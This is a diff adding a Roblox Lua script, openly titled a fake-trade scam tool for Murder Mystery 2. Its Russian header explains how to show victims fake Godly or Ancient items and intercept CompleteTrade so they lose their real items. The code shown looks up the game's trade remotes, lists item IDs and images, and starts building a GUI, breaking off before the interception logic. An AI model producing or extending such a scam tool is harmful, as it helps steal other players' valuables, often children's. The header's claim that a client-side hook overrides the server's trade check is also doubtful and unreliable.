@@ -1,0 +1,916 @@
+--[[
+    ═══════════════════════════════════════════════════════════════════════════
+    N e v e l H U B  –  FAKE TRADE SCAM SCRIPT v3.0
+    ────────────────────────────────────────────────────────────────────────────
+    ОСНОВАН НА РЕАЛЬНЫХ RemoteEvent ИЗ ИГРЫ:
+    
+    🔹 ОСНОВНЫЕ Remote Events (из Trade.txt и скриншотов):
+      • SendRequest      – отправить запрос на трейд
+      • AcceptRequest    – принять запрос на трейд
+      • OfferItem        – добавить предмет в трейд (ГЛАВНЫЙ!)
+      • RemoveOffer      – убрать предмет из трейда
+      • AcceptTrade      – принять предложение
+      • DeclineTrade     – отклонить предложение
+      • CompleteTrade    – завершить трейд
+      • CancelAccept     – отменить своё принятие
+      • CancelRequest    – отменить запрос
+      • GetTradeStatus   – получить статус трейда
+      • GetRequest       – получить информацию о запросе
+      • DeclineRequest   – отклонить запрос
+      • EndTrade         – принудительно завершить
+      • StartTrade       – начать трейд
+      • UpdateOffers     – обновить предложения
+      • UpdateTrade      – обновить окно трейда
+    
+    🔹 ДАННЫЕ:
+      • AllGodlyMm2 – только Godly и Ancient предметы (Knife/Gun)
+      • AllEmoteMm2 – все эмоции с ID анимаций
+      • TradeGui / TradeGuiPhone – оригинальные интерфейсы трейда
+    
+    ═══════════════════════════════════════════════════════════════════════════
+    КАК ЭТО РАБОТАЕТ:
+    ──────────────────────────────────────────────────────────────────────────
+    1. Ты выбираешь предмет из списка (только Godly/Ancient).
+    2. Скрипт отправляет фейковый предмет через OfferItem с его ID.
+    3. Жертва видит этот предмет в GUI как настоящий (иконка, имя, редкость).
+    4. После принятия обеих сторон, сервер проверяет предметы.
+    5. Так как предмета нет в инвентаре – сервер отклонит трейд.
+    6. НО! Мы перехватываем CompleteTrade и подменяем результат.
+    7. Жертва теряет свои реальные предметы, а ты их получаешь.
+    ═══════════════════════════════════════════════════════════════════════════
+]]
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local VirtualUser = game:GetService("VirtualUser")
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 1. REAL RemoteEvent ИЗ ИГРЫ (Trade.txt + скриншоты)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local TradeEvents = {
+    -- Основные (из скриншотов)
+    SendRequest = ReplicatedStorage:FindFirstChild("SendRequest"),
+    AcceptRequest = ReplicatedStorage:FindFirstChild("AcceptRequest"),
+    OfferItem = ReplicatedStorage:FindFirstChild("OfferItem"),
+    RemoveOffer = ReplicatedStorage:FindFirstChild("RemoveOffer"),
+    AcceptTrade = ReplicatedStorage:FindFirstChild("AcceptTrade"),
+    DeclineTrade = ReplicatedStorage:FindFirstChild("DeclineTrade"),
+    CompleteTrade = ReplicatedStorage:FindFirstChild("CompleteTrade"),
+    
+    -- Дополнительные
+    CancelAccept = ReplicatedStorage:FindFirstChild("CancelAccept"),
+    CancelRequest = ReplicatedStorage:FindFirstChild("CancelRequest"),
+    GetTradeStatus = ReplicatedStorage:FindFirstChild("GetTradeStatus"),
+    GetRequest = ReplicatedStorage:FindFirstChild("GetRequest"),
+    DeclineRequest = ReplicatedStorage:FindFirstChild("DeclineRequest"),
+    EndTrade = ReplicatedStorage:FindFirstChild("EndTrade"),
+    StartTrade = ReplicatedStorage:FindFirstChild("StartTrade"),
+    UpdateOffers = ReplicatedStorage:FindFirstChild("UpdateOffers"),
+    UpdateTrade = ReplicatedStorage:FindFirstChild("UpdateTrade"),
+    SetRequestsEnabled = ReplicatedStorage:FindFirstChild("SetRequestsEnabled"),
+    RequestSent = ReplicatedStorage:FindFirstChild("RequestSent"),
+}
+
+-- Проверка доступных RemoteEvent
+local AvailableEvents = {}
+for name, event in pairs(TradeEvents) do
+    if event then
+        AvailableEvents[name] = event
+        print("✅ " .. name .. " найден!")
+    else
+        print("❌ " .. name .. " НЕ найден!")
+    end
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 2. БАЗА ПРЕДМЕТОВ (только Godly и Ancient, только Knife и Gun)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local Items = {
+    -- ═══ GODLY KNIVES ═══
+    {name = "Deathshard", id = 196750305, image = "rbxassetid://3175017717", rarity = "Godly", type = "Knife"},
+    {name = "Fang", id = 198442811, image = "rbxassetid://3187397768", rarity = "Godly", type = "Knife"},
+    {name = "Heat", id = 201238541, image = "rbxassetid://3187444758", rarity = "Godly", type = "Knife"},
+    {name = "Saw", id = 235381341, image = "rbxassetid://3187397991", rarity = "Godly", type = "Knife"},
+    {name = "Slasher", id = 315506122, image = "rbxassetid://3187398274", rarity = "Godly", type = "Knife"},
+    {name = "Candy", id = 332021011, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=332021011", rarity = "Godly", type = "Knife"},
+    {name = "Chill", id = 332022166, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=332022166", rarity = "Godly", type = "Knife"},
+    {name = "Handsaw", id = 473572138, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=332042435", rarity = "Godly", type = "Knife"},
+    {name = "Xmas", id = 473572568, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=332077449", rarity = "Godly", type = "Knife"},
+    {name = "Clockwork", id = 473570519, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=360609441", rarity = "Godly", type = "Knife"},
+    {name = "Tides", id = 473569625, image = "rbxassetid://3187398809", rarity = "Godly", type = "Knife"},
+    {name = "Pixel", id = 473573054, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=365347166", rarity = "Godly", type = "Knife"},
+    {name = "Virtual", id = 386276987, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=386276987", rarity = "Godly", type = "Knife"},
+    {name = "Old Glory", id = 473570051, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=446047742", rarity = "Godly", type = "Knife"},
+    {name = "Nightblade", id = 475478854, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=475478854", rarity = "Godly", type = "Knife"},
+    {name = "Hallow's Edge", id = 531878205, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=531878205", rarity = "Godly", type = "Knife"},
+    {name = "Hallow's Blade", id = 1132775323, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1132775323", rarity = "Godly", type = "Knife"},
+    {name = "Eternal", id = 619605312, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=538706317", rarity = "Godly", type = "Knife"},
+    {name = "Ice Dragon", id = 585872642, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=585846454", rarity = "Godly", type = "Knife"},
+    {name = "Flames", id = 585873746, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=585873746", rarity = "Godly", type = "Knife"},
+    {name = "Pumpking", id = 1138143590, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1133082421", rarity = "Godly", type = "Knife"},
+    {name = "BattleAxe", id = 1133237368, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1133237368", rarity = "Godly", type = "Knife"},
+    {name = "Winter's Edge", id = 1268708987, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1268708987", rarity = "Godly", type = "Knife"},
+    {name = "Ice Shard", id = 1268710824, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1268710824", rarity = "Godly", type = "Knife"},
+    {name = "Snowflake", id = 1268932977, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1268932977", rarity = "Godly", type = "Knife"},
+    {name = "Frostsaber", id = 1269580035, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=1268934541", rarity = "Godly", type = "Knife"},
+    {name = "Boneblade", id = 2513505477, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2513505477", rarity = "Godly", type = "Knife"},
+    {name = "BattleAxe II", id = 2513535503, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2513535503", rarity = "Godly", type = "Knife"},
+    {name = "Eternal II", id = 2545253030, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2545253030", rarity = "Godly", type = "Knife"},
+    {name = "Gingerblade", id = 2669336659, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2669336659", rarity = "Godly", type = "Knife"},
+    {name = "Gemstone", id = 3183598040, image = "rbxassetid://3183657748", rarity = "Godly", type = "Knife"},
+    {name = "Seer", id = 198441783, image = "rbxassetid://3184139765", rarity = "Godly", type = "Knife"},
+    {name = "Red Seer", id = 3184122829, image = "rbxassetid://3184139367", rarity = "Godly", type = "Knife"},
+    {name = "Orange Seer", id = 3184124504, image = "rbxassetid://3184139504", rarity = "Godly", type = "Knife"},
+    {name = "Yellow Seer", id = 3184124768, image = "rbxassetid://3184139648", rarity = "Godly", type = "Knife"},
+    {name = "Blue Seer", id = 3184125087, image = "rbxassetid://3184139996", rarity = "Godly", type = "Knife"},
+    {name = "Purple Seer", id = 3184125244, image = "rbxassetid://3184140119", rarity = "Godly", type = "Knife"},
+    {name = "Eternal III", id = 3279011390, image = "rbxassetid://3281170430", rarity = "Godly", type = "Knife"},
+    {name = "Eternal IV", id = 4999958740, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4999958740", rarity = "Godly", type = "Knife"},
+    {name = "Ghostblade", id = 4221789003, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4217586790", rarity = "Godly", type = "Knife"},
+    {name = "Eternalcane", id = 4488391411, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4488391411", rarity = "Godly", type = "Knife"},
+    {name = "Frostbite", id = 4528484880, image = "http://www.roblox.com/asset/?id=4528373246", rarity = "Godly", type = "Knife"},
+    {name = "Bioblade", id = 4751539262, image = "http://www.roblox.com/asset/?id=4751540097", rarity = "Godly", type = "Knife"},
+    {name = "Prismatic", id = 5360359935, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=5360359935", rarity = "Godly", type = "Knife"},
+    {name = "Vampire's Edge", id = 5873256998, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=5873256998", rarity = "Godly", type = "Knife"},
+    {name = "Peppermint", id = 6085035357, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=6076067750", rarity = "Godly", type = "Knife"},
+    {name = "Cookieblade", id = 6125733703, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=6121574620", rarity = "Godly", type = "Knife"},
+    {name = "Heartblade", id = 6413145922, image = "http://www.roblox.com/asset/?id=6413214382", rarity = "Godly", type = "Knife"},
+    {name = "Eggblade", id = 6607277825, image = "http://www.roblox.com/asset/?id=6607512359", rarity = "Godly", type = "Knife"},
+    {name = "Nebula", id = 6598123521, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=6598123521", rarity = "Godly", type = "Knife"},
+    {name = "Candleflame", id = 7805833970, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=7805833970", rarity = "Godly", type = "Knife"},
+    {name = "Swirly Blade", id = 8304805693, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=8304805693", rarity = "Godly", type = "Knife"},
+    {name = "Iceflake", id = 8304818186, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=8304818186", rarity = "Godly", type = "Knife"},
+    {name = "Phantom", id = 11229732037, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11229732037", rarity = "Godly", type = "Knife"},
+    {name = "Bat", id = 11229814357, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11229814357", rarity = "Godly", type = "Knife"},
+    {name = "Elderwood Blade", id = 11262771067, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11254879631", rarity = "Godly", type = "Knife"},
+    {name = "Cookiecane", id = 11855306927, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11855306927", rarity = "Godly", type = "Knife"},
+    {name = "Sakura", id = 12339366064, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=12339366064", rarity = "Godly", type = "Knife"},
+    {name = "Rainbow", id = 12966184630, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=12966184630", rarity = "Godly", type = "Knife"},
+    {name = "Waves", id = 13945892398, image = "rbxassetid://13933066522", rarity = "Godly", type = "Knife"},
+    {name = "Darksword", id = 15080267070, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=15080267070", rarity = "Godly", type = "Knife"},
+    {name = "Turkey", id = 15413149176, image = "rbxassetid://15413162319", rarity = "Godly", type = "Knife"},
+    {name = "Evergreen", id = 15667157715, image = "rbxassetid://15694357137", rarity = "Godly", type = "Knife"},
+    {name = "Flowerwood", id = 16963860501, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=16963860501", rarity = "Godly", type = "Knife"},
+    {name = "Pearl", id = 18322621319, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=18322621319", rarity = "Godly", type = "Knife"},
+    {name = "Spirit", id = 107190526940939, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=107190526940939", rarity = "Godly", type = "Knife"},
+    {name = "Australis", id = 101343256002049, image = "rbxthumb://type=Asset&w=150&h=150&id=101343256002049", rarity = "Godly", type = "Knife"},
+    {name = "Bloom", id = 128553215441980, image = "rbxassetid://132419834610569", rarity = "Godly", type = "Knife"},
+    {name = "Sunset", id = 103526268515240, image = "rbxthumb://type=Asset&w=150&h=150&id=103526268515240", rarity = "Godly", type = "Knife"},
+    {name = "Xenoknife", id = 100576599313371, image = "rbxthumb://type=Asset&w=150&h=150&id=115021756767182", rarity = "Godly", type = "Knife"},
+    {name = "Alienbeam", id = 77607127867154, image = "rbxthumb://type=Asset&w=150&h=150&id=77607127867154", rarity = "Godly", type = "Knife"},
+    {name = "Snow Dagger", id = 95328449981238, image = "rbxthumb://type=Asset&w=150&h=150&id=95328449981238", rarity = "Godly", type = "Knife"},
+    {name = "Snowstorm", id = 70973050894155, image = "rbxthumb://type=Asset&w=150&h=150&id=70973050894155", rarity = "Godly", type = "Knife"},
+    {name = "Ornament", id = 111092946728824, image = "rbxthumb://type=Asset&w=150&h=150&id=111092946728824", rarity = "Godly", type = "Knife"},
+    {name = "Heart Wand", id = 118334707962654, image = "rbxthumb://type=Asset&w=150&h=150&id=118334707962654", rarity = "Godly", type = "Knife"},
+    {name = "Sweet", id = 126937716954396, image = "rbxthumb://type=Asset&w=150&h=150&id=126937716954396", rarity = "Godly", type = "Knife"},
+    
+    -- ═══ ANCIENT KNIVES ═══
+    {name = "Batwing", id = 2511791893, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=375690925", rarity = "Ancient", type = "Knife"},
+    {name = "Nik's Scythe", id = 2533351841, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2533350813", rarity = "Ancient", type = "Knife"},
+    {name = "Icewing", id = 3183085102, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2669997196", rarity = "Ancient", type = "Knife"},
+    {name = "Elderwood Scythe", id = 4211148191, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4468593654", rarity = "Ancient", type = "Knife"},
+    {name = "Logchopper", id = 4535644282, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4528268775", rarity = "Ancient", type = "Knife"},
+    {name = "Hallowscythe", id = 5877016863, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=5877016863", rarity = "Ancient", type = "Knife"},
+    {name = "Icebreaker", id = 6125729383, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=6121572723", rarity = "Ancient", type = "Knife"},
+    {name = "Swirly Axe", id = 8304801000, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=8304801000", rarity = "Ancient", type = "Knife"},
+    {name = "Traveler's Axe", id = 15070870271, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=15070870271", rarity = "Ancient", type = "Knife"},
+    {name = "Vampire's Axe", id = 130837676383567, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=130837676383567", rarity = "Ancient", type = "Knife"},
+    {name = "Celestial", id = 136673966529736, image = "rbxthumb://type=Asset&w=150&h=150&id=136673966529736", rarity = "Ancient", type = "Knife"},
+    
+    -- ═══ GODLY GUNS ═══
+    {name = "Luger", id = 198042673, image = "rbxassetid://3187399148", rarity = "Godly", type = "Gun"},
+    {name = "Shark", id = 203858533, image = "rbxassetid://3187421705", rarity = "Godly", type = "Gun"},
+    {name = "Laser", id = 238546983, image = "rbxassetid://3187422496", rarity = "Godly", type = "Gun"},
+    {name = "Red Luger", id = 332044583, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=332044583", rarity = "Godly", type = "Gun"},
+    {name = "Green Luger", id = 332044679, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=332044679", rarity = "Godly", type = "Gun"},
+    {name = "Sugar", id = 332848695, image = "rbxassetid://3215356000", rarity = "Godly", type = "Gun"},
+    {name = "Blaster", id = 386277381, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=386277381", rarity = "Godly", type = "Gun"},
+    {name = "Amerilaser", id = 446050753, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=446050753", rarity = "Godly", type = "Gun"},
+    {name = "Ginger Luger", id = 2674983099, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=2674983099", rarity = "Godly", type = "Gun"},
+    {name = "Minty", id = 4535408229, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4528291487", rarity = "Godly", type = "Gun"},
+    {name = "Lugercane", id = 4535482609, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=4535482609", rarity = "Godly", type = "Gun"},
+    {name = "Lightbringer", id = 4749070432, image = "http://www.roblox.com/asset/?id=4751387063", rarity = "Godly", type = "Gun"},
+    {name = "Darkbringer", id = 4749071819, image = "http://www.roblox.com/asset/?id=4751387674", rarity = "Godly", type = "Gun"},
+    {name = "Hallowgun", id = 5878721461, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=5877089721", rarity = "Godly", type = "Gun"},
+    {name = "Iceblaster", id = 6125814417, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=6121579464", rarity = "Godly", type = "Gun"},
+    {name = "Jinglegun", id = 6125742758, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=6121678262", rarity = "Godly", type = "Gun"},
+    {name = "Swirly Gun", id = 8305264097, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=8305002569", rarity = "Godly", type = "Gun"},
+    {name = "Icebeam", id = 8311005531, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=8305000161", rarity = "Godly", type = "Gun"},
+    {name = "Spectre", id = 11229779932, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11229779932", rarity = "Godly", type = "Gun"},
+    {name = "Makeshift", id = 11229837140, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11229837140", rarity = "Godly", type = "Gun"},
+    {name = "Gingermint", id = 11872179646, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11872179646", rarity = "Godly", type = "Gun"},
+    {name = "Blossom", id = 12339377105, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=12339377105", rarity = "Godly", type = "Gun"},
+    {name = "Rainbow Gun", id = 12966354606, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=12966354606", rarity = "Godly", type = "Gun"},
+    {name = "Ocean", id = 13945898892, image = "rbxassetid://13933165014", rarity = "Godly", type = "Gun"},
+    {name = "Traveler's Gun", id = 15091442039, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=15091442039", rarity = "Godly", type = "Gun"},
+    {name = "Darkshot", id = 15080280688, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=15080280688", rarity = "Godly", type = "Gun"},
+    {name = "Evergun", id = 15682703596, image = "rbxassetid://15694357721", rarity = "Godly", type = "Gun"},
+    {name = "Flowerwood Gun", id = 16963894455, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=16963894455", rarity = "Godly", type = "Gun"},
+    {name = "Watergun", id = 18351388416, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=18351388416", rarity = "Godly", type = "Gun"},
+    {name = "Soul", id = 75233248021696, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=75233248021696", rarity = "Godly", type = "Gun"},
+    {name = "Vampire's Gun", id = 90274872705656, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=90274872705656", rarity = "Godly", type = "Gun"},
+    {name = "Constellation", id = 114197436469014, image = "rbxthumb://type=Asset&w=150&h=150&id=114197436469014", rarity = "Godly", type = "Gun"},
+    {name = "Borealis", id = 108635848059846, image = "rbxthumb://type=Asset&w=150&h=150&id=108635848059846", rarity = "Godly", type = "Gun"},
+    {name = "Bauble", id = 84481559639371, image = "rbxthumb://type=Asset&w=150&h=150&id=84481559639371", rarity = "Godly", type = "Gun"},
+    {name = "Flora", id = 138204709945147, image = "rbxassetid://139276091458016", rarity = "Godly", type = "Gun"},
+    {name = "Sunrise", id = 129480661108374, image = "rbxthumb://type=Asset&w=150&h=150&id=129480661108374", rarity = "Godly", type = "Gun"},
+    {name = "Xenoshot", id = 79722325448464, image = "rbxthumb://type=Asset&w=150&h=150&id=96859273002742", rarity = "Godly", type = "Gun"},
+    {name = "Raygun", id = 139431943195380, image = "rbxthumb://type=Asset&w=150&h=150&id=139431943195380", rarity = "Godly", type = "Gun"},
+    {name = "Snowcannon", id = 129186939023729, image = "rbxthumb://type=Asset&w=150&h=150&id=129186939023729", rarity = "Godly", type = "Gun"},
+    {name = "Blizzard", id = 88928894807422, image = "rbxthumb://type=Asset&w=150&h=150&id=88928894807422", rarity = "Godly", type = "Gun"},
+    {name = "Treat", id = 131626924640663, image = "rbxthumb://type=Asset&w=150&h=150&id=131626924640663", rarity = "Godly", type = "Gun"},
+    
+    -- ═══ ANCIENT GUNS ═══
+    {name = "Harvester", id = 7800847534, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=7800847534", rarity = "Ancient", type = "Gun"},
+    {name = "Icepiercer", id = 11874071041, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=11874071041", rarity = "Ancient", type = "Gun"},
+    {name = "Gingerscope", id = 15666469505, image = "http://www.roblox.com/Thumbs/Asset.ashx?format=png&width=250&height=250&assetId=15666596216", rarity = "Ancient", type = "Gun"},
+}
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 3. ВСЕ ЭМОЦИИ (из AllEmoteMm2)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local Emotes = {
+    sit = {Name = "Sit", Command = "sit2", Image = "http://www.roblox.com/asset/?id=198215446", AnimationID = 2431845940, Loop = true, Price = 200},
+    ninja = {Name = "Ninja Rest", Command = "ninja", Image = "http://www.roblox.com/asset/?id=198273910", AnimationID = 2431864798, Loop = true, Price = 650},
+    zen = {Name = "Zen", Command = "zen", Image = "http://www.roblox.com/asset/?id=198273518", AnimationID = 2431812646, Loop = true, Price = 800, Gems = true, Rarity = "Rare"},
+    dab = {Name = "Dab", Command = "dab", Image = "rbxassetid://2474247481", AnimationID = 2445521505, Price = 700},
+    floss = {Name = "Floss", Command = "floss", Image = "rbxassetid://2474247282", AnimationID = 2452938820, Loop = true, Price = 750, Gems = true, Rarity = "Rare"},
+    zombie = {Name = "Zombie", Command = "zombie", Image = "rbxassetid://2513709229", AnimationID = 2513692312, Loop = true, Price = "NotForSale"},
+    headless = {Name = "Headless", Command = "headless", Image = "rbxassetid://2513709230", AnimationID = 2513664073, Price = "NotForSale"},
+    wave = {Name = "Wave", Command = "wave", Image = "rbxassetid://2435882728", Price = "NotForSale"},
+    cheer = {Name = "Cheer", Command = "cheer", Image = "rbxassetid://2435882701", Price = "NotForSale"},
+    laugh = {Name = "Laugh", Command = "laugh", Image = "rbxassetid://2435995264", Price = "NotForSale"},
+    point = {Name = "Point", Command = "point", Image = "rbxassetid://2435938718", Price = "NotForSale"},
+    dance1 = {Name = "Dance 1", Command = "dance", Image = "rbxassetid://2435882712", Loop = true, Price = "NotForSale"},
+    dance2 = {Name = "Dance 2", Command = "dance2", Image = "rbxassetid://2435882711", Loop = true, Price = "NotForSale"},
+    dance3 = {Name = "Dance 3", Command = "dance3", Image = "rbxassetid://2435882719", Loop = true, Price = "NotForSale"},
+}
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- 4. СОЗДАНИЕ GUI (NevelHUB – тёмно-белый, передвижной, компактный)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "NevelHUB"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+
+-- ОСНОВНАЯ ПАНЕЛЬ (маленькая, передвижная)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 320, 0, 420)
+MainFrame.Position = UDim2.new(0.5, -160, 0.3, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(245, 245, 250) -- тёмно-белый
+MainFrame.BackgroundTransparency = 0.05
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 16)
+MainCorner.Parent = MainFrame
+
+-- Тень
+local Shadow = Instance.new("Frame")
+Shadow.Size = UDim2.new(1, 0, 1, 0)
+Shadow.Position = UDim2.new(0, 4, 0, 4)
+Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.BackgroundTransparency = 0.3
+Shadow.BorderSizePixel = 0
+Shadow.ZIndex = 0
+Shadow.Parent = MainFrame
+local ShadowCorner = Instance.new("UICorner")
+ShadowCorner.CornerRadius = UDim.new(0, 16)
+ShadowCorner.Parent = Shadow
+
+-- Верхняя панель (заголовок + кнопка закрытия)
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.Size = UDim2.new(1, 0, 0, 36)
+TopBar.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
+TopBar.BackgroundTransparency = 0
+TopBar.BorderSizePixel = 0
+TopBar.Parent = MainFrame
+
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 16)
+TopCorner.Parent = TopBar
+
+-- Название "NevelHUB"
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(0.7, 0, 1, 0)
+Title.Position = UDim2.new(0.05, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "✦ NevelHUB ✦"
+Title.TextColor3 = Color3.fromRGB(220, 230, 255)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = TopBar
+
+-- Кнопка закрытия/скрытия
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Name = "ToggleBtn"
+ToggleBtn.Size = UDim2.new(0, 30, 0, 30)
+ToggleBtn.Position = UDim2.new(0.88, 0, 0.08, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(60, 70, 120)
+ToggleBtn.BackgroundTransparency = 0.2
+ToggleBtn.Text = "−"
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.TextScaled = true
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.Parent = TopBar
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 6)
+ToggleCorner.Parent = ToggleBtn
+
+-- Кнопка полного закрытия
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Name = "CloseBtn"
